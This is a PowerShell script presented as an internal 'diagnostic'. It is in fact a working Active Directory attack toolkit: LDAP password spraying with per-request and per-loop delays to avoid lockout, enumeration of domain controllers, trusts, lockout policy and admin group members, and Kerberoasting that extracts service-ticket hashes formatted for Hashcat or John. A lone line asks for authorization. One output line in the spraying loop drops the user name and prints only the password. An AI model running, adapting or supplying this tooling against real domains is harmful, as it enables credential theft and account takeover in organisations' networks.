<#
.SYNOPSIS
Runs one of three internal diagnostic modes: password testing, domain inventory,
or Kerberoasting validation.

.DESCRIPTION
Password Test
  Tests user and password combinations by performing LDAP bind attempts.

Domain Information
  Collects domain controllers, trusts, password policy, Domain Admins, and
  Enterprise Admins.

Kerberoasting
  Enumerates SPN-backed service accounts and requests Kerberos service tickets
  to confirm that ticket hashes can be produced.

.PARAMETER UserFile
Password Test mode only. Text file containing one user name per line.

.PARAMETER PasswordFile
Password Test mode only. Text file containing passwords.

.PARAMETER DC
Used by Password Test, Domain Information, and Kerberoasting modes as the
preferred or fallback domain controller when provided.

.PARAMETER Domain
Used by all modes. In Password Test mode it is the credential domain. In the
other modes it is the target domain to inspect. When omitted in Domain
Information or Kerberoasting mode, the current session domain is used.

.PARAMETER SharedDefault
Password Test mode only. Tests every password against every user. Alias:
-default.

.PARAMETER PerUser
Password Test mode only. Matches each user with the password on the same line.
Alias: -personal.

.PARAMETER DelayPerRequest
Password Test mode only. Delay in seconds between individual LDAP bind
attempts.

.PARAMETER DelayPerLoop
Password Test mode only. Delay in minutes between password loops in
-SharedDefault mode.

.PARAMETER DomainInfo
Selects Domain Information mode.

.PARAMETER Kerberoasting
Selects Kerberoasting mode.

.PARAMETER SearchBase
Kerberoasting mode only. LDAP search base or distinguished name to limit the
search scope.

.PARAMETER OutputFormat
Kerberoasting mode only. Selects John or Hashcat output formatting.

.EXAMPLE
.\aduser.ps1 -UserFile .\users.txt -PasswordFile .\passwords.txt `
    -DC dc01.contoso.local -Domain contoso.local -personal

Runs Password Test mode and pairs each user with the password on the same line.

.EXAMPLE
.\aduser.ps1 -UserFile .\users.txt -PasswordFile .\passwords.txt `
    -DC dc01.contoso.local -Domain contoso.local -default `
    -DelayPerRequest 1 -DelayPerLoop 5

Runs Password Test mode, testing each password against every user with delays
between requests and password loops.

.EXAMPLE
.\aduser.ps1 -Domain contoso.local -DC dc01.contoso.local -DomainInfo

Runs Domain Information mode for contoso.local.

.EXAMPLE
.\aduser.ps1 -Kerberoasting -Domain contoso.local -DC dc01.contoso.local

Runs Kerberoasting mode and prints ticket hashes for SPN-backed service
accounts.

.NOTES
Use this script only on systems and accounts for which testing has been
explicitly authorized. Keep this file encoded as UTF-8 with BOM for Windows
PowerShell 5.1 compatibility.
#>
[CmdletBinding(DefaultParameterSetName="Check")]
param(
    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$UserFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [string]$PasswordFile,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [Parameter(Mandatory=$false, ParameterSetName="Kerberoast")]
    [string]$DC,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Parameter(Mandatory=$false, ParameterSetName="DomainInfo")]
    [Parameter(Mandatory=$false, ParameterSetName="Kerberoast")]
    [string]$Domain,

    [Parameter(Mandatory=$true, ParameterSetName="DomainInfo")]
    [switch]$DomainInfo,

    [Parameter(Mandatory=$true, ParameterSetName="Kerberoast")]
    [Alias("kerberoast")]
    [switch]$Kerberoasting,

    [Parameter(Mandatory=$false, ParameterSetName="Kerberoast")]
    [string]$SearchBase,

    [Parameter(Mandatory=$false, ParameterSetName="Kerberoast")]
    [ValidateSet("Hashcat", "John")]
    [string]$OutputFormat = "Hashcat",

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 3600)]
    [double]$DelayPerRequest = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [ValidateRange(0, 1440)]
    [double]$DelayPerLoop = 0,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("default")]
    [switch]$SharedDefault,

    [Parameter(Mandatory=$false, ParameterSetName="Check")]
    [Alias("personal")]
    [switch]$PerUser
)

Add-Type -AssemblyName System.DirectoryServices.Protocols
Add-Type -AssemblyName System.DirectoryServices
Add-Type -AssemblyName System.IdentityModel

function Convert-Mick3yDomainToDn {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DomainName
    )

    return ($DomainName.Split('.') | ForEach-Object { "DC=$_" }) -join ','
}

function Get-Mick3yCurrentDomainName {
    try {
        return [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }
    catch {
        Stop-Script "Unable to determine the current domain. Specify -Domain explicitly."
    }
}

function New-Mick3yDirectorySearcher {
    param(
        [string]$TargetDomain,
        [string]$TargetServer,
        [string]$TargetSearchBase
    )

    if ([string]::IsNullOrWhiteSpace($TargetDomain)) {
        $TargetDomain = Get-Mick3yCurrentDomainName
    }

    $searchRoot = $null

    if (-not [string]::IsNullOrWhiteSpace($TargetSearchBase)) {
        if ($TargetSearchBase -match '^LDAP://') {
            $searchRoot = $TargetSearchBase
        }
        else {
            if ($TargetSearchBase -match '^[A-Za-z]+=') {
                if ($TargetServer) {
                    $searchRoot = "LDAP://$TargetServer/$TargetSearchBase"
                }
                else {
                    $searchRoot = "LDAP://$TargetSearchBase"
                }
            }
            else {
                if ($TargetServer) {
                    $searchRoot = "LDAP://$TargetServer/$TargetSearchBase"
                }
                else {
                    $searchRoot = "LDAP://$TargetSearchBase"
                }
            }
        }
    }
    else {
        $domainDn = Convert-Mick3yDomainToDn -DomainName $TargetDomain
        if ($TargetServer) {
            $searchRoot = "LDAP://$TargetServer/$domainDn"
        }
        else {
            $searchRoot = "LDAP://$domainDn"
        }
    }

    $root = New-Object System.DirectoryServices.DirectoryEntry($searchRoot)
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
    $searcher.PageSize = 1000
    $searcher.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    $searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::None
    $searcher.CacheResults = $false

    return $searcher
}

function Get-Mick3yServiceAccountSpns {
    param(
        [string]$TargetDomain,
        [string]$TargetServer,
        [string]$TargetSearchBase
    )

    $searcher = New-Mick3yDirectorySearcher -TargetDomain $TargetDomain -TargetServer $TargetServer -TargetSearchBase $TargetSearchBase
    try {
        $searcher.Filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
        [void]$searcher.PropertiesToLoad.Add('samaccountname')
        [void]$searcher.PropertiesToLoad.Add('distinguishedname')
        [void]$searcher.PropertiesToLoad.Add('serviceprincipalname')

        foreach ($entry in $searcher.FindAll()) {
            $spnValues = @(
                $entry.Properties['serviceprincipalname'] |
                    ForEach-Object { [string]$_ } |
                    Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
            )

            if ($spnValues.Count -eq 0) {
                continue
            }

            [PSCustomObject]@{
                SamAccountName       = [string]$entry.Properties['samaccountname'][0]
                DistinguishedName    = [string]$entry.Properties['distinguishedname'][0]
                ServicePrincipalName = $spnValues[0]
            }
        }
    }
    finally {
        if ($searcher) {
            $searcher.Dispose()
        }
    }
}

function Convert-Mick3yKerberosTicketHash {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory = $true)]
        [string]$SamAccountName,

        [Parameter(Mandatory = $true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory = $true)]
        [ValidateSet('Hashcat', 'John')]
        [string]$Format
    )

    $ticket = $null

    try {
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $ServicePrincipalName
    }
    catch {
        return [PSCustomObject]@{
            SamAccountName       = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName    = $DistinguishedName
            Hash                 = $null
            Error                = $_.Exception.Message
        }
    }

    $ticketBytes = $ticket.GetRequest()
    if (-not $ticketBytes) {
        return [PSCustomObject]@{
            SamAccountName       = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName    = $DistinguishedName
            Hash                 = $null
            Error                = 'Ticket bytes were empty.'
        }
    }

    $ticketHex = [System.BitConverter]::ToString($ticketBytes) -replace '-'

    if ($ticketHex -notmatch 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
        return [PSCustomObject]@{
            SamAccountName       = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName    = $DistinguishedName
            Hash                 = $null
            Error                = 'Unable to parse ticket structure.'
        }
    }

    $etype = [Convert]::ToByte($Matches.EtypeLen, 16)
    $cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
    $cipherText = $Matches.DataToEnd.Substring(0, $cipherTextLen * 2)

    if ($Matches.DataToEnd.Substring($cipherTextLen * 2, 4) -ne 'A482') {
        return [PSCustomObject]@{
            SamAccountName       = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName    = $DistinguishedName
            Hash                 = $null
            Error                = 'Unable to verify the ticket ciphertext boundary.'
        }
    }

    if ($Format -eq 'John') {
        $hash = "`$krb5tgs`$${ServicePrincipalName}:$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
    }
    else {
        if ($DistinguishedName -match 'DC=') {
            $domainName = ($DistinguishedName.Substring($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.')
        }
        else {
            $domainName = 'UNKNOWN'
        }

        $hash = "`$krb5tgs`$$etype`$*$SamAccountName`$$domainName`$$ServicePrincipalName*`$$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
    }

    return [PSCustomObject]@{
        SamAccountName       = $SamAccountName
        ServicePrincipalName = $ServicePrincipalName
        DistinguishedName    = $DistinguishedName
        Hash                 = $hash
        Error                = $null
    }
}

function Invoke-Mick3yKerberoasting {
    param(
        [string]$TargetDomain,
        [string]$TargetServer,
        [string]$TargetSearchBase,
        [ValidateSet('Hashcat', 'John')]
        [string]$Format = 'Hashcat'
    )

    if ([string]::IsNullOrWhiteSpace($TargetDomain)) {
        $TargetDomain = Get-Mick3yCurrentDomainName
    }

    Write-Host ("Kerberos Ticket Diagnostic v{0}" -f 'mick3y-1.0.0')

    $serviceAccounts = @(Get-Mick3yServiceAccountSpns -TargetDomain $TargetDomain -TargetServer $TargetServer -TargetSearchBase $TargetSearchBase)

    if ($serviceAccounts.Count -eq 0) {
        Write-Host "No service accounts with SPNs were found."
        return
    }

    $successCount = 0
    $failureCount = 0

    foreach ($account in $serviceAccounts) {
        $result = Convert-Mick3yKerberosTicketHash -ServicePrincipalName $account.ServicePrincipalName -SamAccountName $account.SamAccountName -DistinguishedName $account.DistinguishedName -Format $Format

        if ($result.Hash) {
            $successCount++
            Write-Host ("{0} : {1}" -f $result.SamAccountName, $result.Hash)
        }
        else {
            $failureCount++
            Write-Host ("{0} : {1}" -f $result.SamAccountName, $result.Error)
        }
    }

    Write-Host ""
    Write-Host ("Service accounts found : {0}" -f $serviceAccounts.Count)
    Write-Host ("Hashes retrieved       : {0}" -f $successCount)
    Write-Host ("Failures               : {0}" -f $failureCount)
}

function Stop-Script {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )

    Write-Host $Message -ForegroundColor Red
    exit 1
}

function Invoke-CmdText {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command
    )

    $output = & cmd.exe /c $Command 2>&1

    return @(
        $output |
            ForEach-Object { $_.ToString().Trim() } |
            Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
    )
}

function Get-FirstMatch {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines,

        [Parameter(Mandatory=$true)]
        [string[]]$Patterns
    )

    foreach ($line in @($Lines)) {
        if ([string]::IsNullOrWhiteSpace([string]$line)) {
            continue
        }

        $text = [string]$line

        foreach ($pattern in $Patterns) {
            if ($text -match $pattern) {
                return $Matches[1].Trim()
            }
        }
    }

    return $null
}

function Get-NetGroupMembers {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    $items = New-Object System.Collections.Generic.List[string]
    $capture = $false

    foreach ($line in @($Lines)) {
        $trimmed = [string]$line
        if ($trimmed -ne $null) {
            $trimmed = $trimmed.Trim()
        }

        # The dashed separator is stable across localized versions of net.exe.
        if (-not $capture) {
            if ($trimmed -match '^-{3,}$') {
                $capture = $true
            }
            continue
        }

        if ([string]::IsNullOrWhiteSpace($trimmed)) {
            continue
        }

        if ($trimmed -match '^(The command completed successfully\.|More help is available by typing NET HELPMSG.+|NET HELPMSG .+)$') {
            break
        }

        # net.exe may print multiple account names in fixed-width columns.
        foreach ($member in [regex]::Split($trimmed, '\s{2,}')) {
            $name = $member.Trim().TrimStart('*')
            if (-not [string]::IsNullOrWhiteSpace($name)) {
                $items.Add($name)
            }
        }
    }

    return @($items)
}

function ConvertFrom-DcListLines {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    foreach ($line in @($Lines)) {
        $text = ([string]$line).Trim()
        if ($text -notmatch '^(?:\\\\)?(?<Server>[A-Za-z0-9_.-]+)(?<Details>\s+(?:\[[^\]]+\]\s*)*(?:Site\s*:.*)?)$') {
            continue
        }

        $server = $Matches.Server
        $details = $Matches.Details.Trim()
        $site = if ($details -match 'Site\s*:\s*(?<Site>.+)$') {
            $Matches.Site.Trim()
        }
        else {
            "N/A"
        }

        [PSCustomObject]@{
            Server  = $server
            Address = "N/A"
            Site    = $site
            Flags   = ($details -replace 'Site\s*:.+$', '').Trim()
        }
    }
}

function Get-DirectoryServiceDomainControllers {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DomainName
    )

    try {
        $context = [System.DirectoryServices.ActiveDirectory.DirectoryContext]::new(
            [System.DirectoryServices.ActiveDirectory.DirectoryContextType]::Domain,
            $DomainName
        )
        $domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)

        foreach ($controller in $domainObject.DomainControllers) {
            $address = "N/A"
            try {
                $resolvedAddresses = @(
                    [System.Net.Dns]::GetHostAddresses($controller.Name) |
                        ForEach-Object { $_.IPAddressToString }
                )
                if ($resolvedAddresses.Count -gt 0) {
                    $address = $resolvedAddresses -join ", "
                }
            }
            catch {
                # Keep the controller even when its address cannot be resolved.
            }

            [PSCustomObject]@{
                Server  = $controller.Name
                Address = $address
                Site    = if ($controller.SiteName) { $controller.SiteName } else { "N/A" }
                Flags   = "DirectoryServices"
            }
        }
    }
    catch {
        return @()
    }
}

function ConvertFrom-DomainTrustLines {
    param(
        [Parameter(Mandatory=$true)]
        [object[]]$Lines
    )

    foreach ($line in @($Lines)) {
        $text = ([string]$line).Trim()
        if ($text -notmatch '^(?<Index>\d+)\s*:\s*(?<Trust>.+)$') {
            continue
        }

        [PSCustomObject]@{
            Index = [int]$Matches.Index
            Trust = $Matches.Trust.Trim()
        }
    }
}

function Write-ReportSection {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Title
    )

    Write-Host ""
    Write-Host ("=== {0} ===" -f $Title) -ForegroundColor Cyan
}

function Get-DomainInfo {
    $netbiosName = if ($env:USERDOMAIN) { $env:USERDOMAIN } else { "N/A" }
    $dnsName = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { "N/A" }
    $targetDomain = if ($Domain) { $Domain } elseif ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } elseif ($env:USERDOMAIN) { $env:USERDOMAIN } else { $null }

    $policyLines = Invoke-CmdText "net accounts /domain"
    $minLength = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Minimum password length|Password minimum length)\s*[:：]\s*(\d+)\s*$'
    )
    $lockoutThreshold = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout threshold)\s*[:：]\s*(\d+)\s*$'
    )
    $lockoutDuration = Get-FirstMatch -Lines $policyLines -Patterns @(
        '^(?:Lockout duration(?: \(minutes\))?)\s*[:：]\s*([0-9]+|Never)\s*$'
    )

    if ($null -eq $minLength) {
        $minLength = "N/A"
    }

    if ($null -eq $lockoutThreshold) {
        $lockoutThreshold = "N/A"
    }

    if ($null -eq $lockoutDuration) {
        $lockoutDuration = "N/A"
    }
    elseif ($lockoutDuration -match '^\d+$') {
        $lockoutDuration = "$lockoutDuration minutes"
    }
    $dcName = "N/A"
    $dcAddress = "N/A"
    $dcList = @()
    $trustList = @()
    $domainAdmins = @()
    $enterpriseAdmins = @()

    if ($targetDomain) {
        $dcGetLines = Invoke-CmdText ("nltest /dsgetdc:{0}" -f $targetDomain)
        $dcName = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*(?:DC|Domain Controller)\s*[:：]\s*\\*([^\s]+)'
        )
        $dcAddress = Get-FirstMatch -Lines $dcGetLines -Patterns @(
            '^\s*(?:Address)\s*[:：]\s*\\*([^\s]+)'
        )

        $dcList = @(Get-DirectoryServiceDomainControllers -DomainName $targetDomain)

        # nltest is retained as a fallback and may discover a controller that
        # DirectoryServices did not return in the current logon context.
        $dcListLines = Invoke-CmdText ("nltest /dclist:{0}" -f $targetDomain)
        $nltestDcList = @(ConvertFrom-DcListLines -Lines $dcListLines)
        foreach ($controller in $nltestDcList) {
            if (-not ($dcList | Where-Object { $_.Server -ieq $controller.Server })) {
                $dcList += $controller
            }
        }

        $dcList = @($dcList | Sort-Object Server -Unique)

        if ((-not $dcName -or $dcName -eq "N/A") -and $DC) {
            $dcName = $DC.TrimStart('\')
        }
        elseif ((-not $dcName -or $dcName -eq "N/A") -and $dcList.Count -gt 0) {
            $dcName = $dcList[0].Server
        }

        if ((!$dcAddress -or $dcAddress -eq "N/A") -and $dcName) {
            $matchedController = $dcList | Where-Object { $_.Server -ieq $dcName } | Select-Object -First 1
            if ($matchedController -and $matchedController.Address -ne "N/A") {
                $dcAddress = $matchedController.Address
            }
        }
    }

    $trustLines = Invoke-CmdText "nltest /domain_trusts"
    $trustList = @(ConvertFrom-DomainTrustLines -Lines $trustLines)

    $domainAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Domain Admins" /domain')
    $enterpriseAdmins = Get-NetGroupMembers -Lines (Invoke-CmdText 'net group "Enterprise Admins" /domain')

    Write-ReportSection "Domain Inventory"
    [PSCustomObject]@{
        "Target Domain" = if ($targetDomain) { $targetDomain } else { "N/A" }
        "NetBIOS Name"  = $netbiosName
        "DNS Name"      = $dnsName
        "Primary DC"    = if ($dcName) { $dcName } else { "N/A" }
        "DC Address"    = if ($dcAddress) { $dcAddress } else { "N/A" }
    } | Format-List | Out-Host

    Write-Host "Domain Controllers" -ForegroundColor Yellow
    if ($dcList.Count -gt 0) {
        $dcList | Format-Table -AutoSize | Out-Host
    }
    else {
        Write-Host "  N/A"
    }

    Write-Host "Domain Trusts" -ForegroundColor Yellow
    if ($trustList.Count -gt 0) {
        foreach ($trust in @($trustList | Sort-Object Trust -Unique)) {
            Write-Host ("  - {0}" -f $trust.Trust)
        }
    }
    else {
        Write-Host "  N/A"
    }

    Write-ReportSection "Password Policy"
    [PSCustomObject]@{
        "Minimum Password Length" = $minLength
        "Lockout Threshold"       = $lockoutThreshold
        "Lockout Duration"        = $lockoutDuration
    } | Format-List | Out-Host

    Write-ReportSection "Administrative Groups"
    Write-Host "Domain Admins" -ForegroundColor Yellow
    if ($domainAdmins.Count -gt 0) {
        foreach ($member in @($domainAdmins | Sort-Object -Unique)) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  N/A"
    }

    Write-Host "Enterprise Admins" -ForegroundColor Yellow
    if ($enterpriseAdmins.Count -gt 0) {
        foreach ($member in @($enterpriseAdmins | Sort-Object -Unique)) {
            Write-Host ("  - {0}" -f $member)
        }
    }
    else {
        Write-Host "  N/A"
    }
}

if ($PSCmdlet.ParameterSetName -eq "DomainInfo") {
    Get-DomainInfo
    exit 0
}

if ($PSCmdlet.ParameterSetName -eq "Kerberoast") {
    Invoke-Mick3yKerberoasting -TargetDomain $Domain -TargetServer $DC -TargetSearchBase $SearchBase -Format $OutputFormat
    exit 0
}

if (-not $UserFile -or -not $PasswordFile) {
    Stop-Script "UserFile and PasswordFile are required unless -DomainInfo is used."
}

$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
# Passwords must be read verbatim except for trailing CR from Windows line endings.
$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })

if ($SharedDefault -and $PerUser) {
    Stop-Script "-SharedDefault and -personal cannot be used together."
}

if (($DelayPerRequest * 10) % 1 -ne 0) {
    Stop-Script "DelayPerRequest must be specified in 0.1 second increments."
}

$delayPerLoopSeconds = [int]($DelayPerLoop * 60)

$mode = if ($SharedDefault) { "SharedDefault" } else { "Personal" }

if ($mode -eq "SharedDefault") {
    if ($passwords.Count -lt 1) {
        Stop-Script "Shared default mode requires at least one password in PasswordFile."
    }
}
elseif ($users.Count -ne $passwords.Count) {
    Stop-Script "Personal mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default to apply one or more shared passwords to all users."
}

$foundCount = 0

if ($mode -eq "SharedDefault") {
    for ($p = 0; $p -lt $passwords.Count; $p++) {
        $password = $passwords[$p]

        for ($i = 0; $i -lt $users.Count; $i++) {
            $user = $users[$i]

            $fullUser = "$Domain\$user"

            $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
            $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

            try {
                $netCred = New-Object System.Net.NetworkCredential(
                    $user,
                    $password,
                    $Domain
                )

                # Attempt exactly one bind per user/password pair.
                $conn.Bind($netCred)

                $foundCount++
                Write-Host ("{1}" -f $fullUser, $password)
            }
            catch {
                continue
            }
            finally {
                $conn.Dispose()
            }

            if ($DelayPerRequest -gt 0) {
                $isLastPassword = ($p -eq ($passwords.Count - 1))
                $isLastUser = ($i -eq ($users.Count - 1))

                if (-not ($isLastPassword -and $isLastUser)) {
                    Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
                }
            }
        }

        if ($delayPerLoopSeconds -gt 0 -and $p -lt ($passwords.Count - 1)) {
            Start-Sleep -Seconds $delayPerLoopSeconds
        }
    }
}
else {
    for ($i = 0; $i -lt $users.Count; $i++) {
        $user = $users[$i]
        $password = $passwords[$i]

        $fullUser = "$Domain\$user"

        $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
        $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

        try {
            $netCred = New-Object System.Net.NetworkCredential(
                $user,
                $password,
                $Domain
            )

            # Attempt exactly one bind per user/password pair.
            $conn.Bind($netCred)

            $foundCount++
            Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
        }
        catch {
            continue
        }
        finally {
            $conn.Dispose()
        }

        if ($DelayPerRequest -gt 0 -and $i -lt ($users.Count - 1)) {
            Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
        }
    }
}

if ($foundCount -gt 0) {
    Write-Host ""
    Write-Host ("Total matches: {0}" -f $foundCount)
}
else {
    Write-Host "No accounts were found using the default password."
}
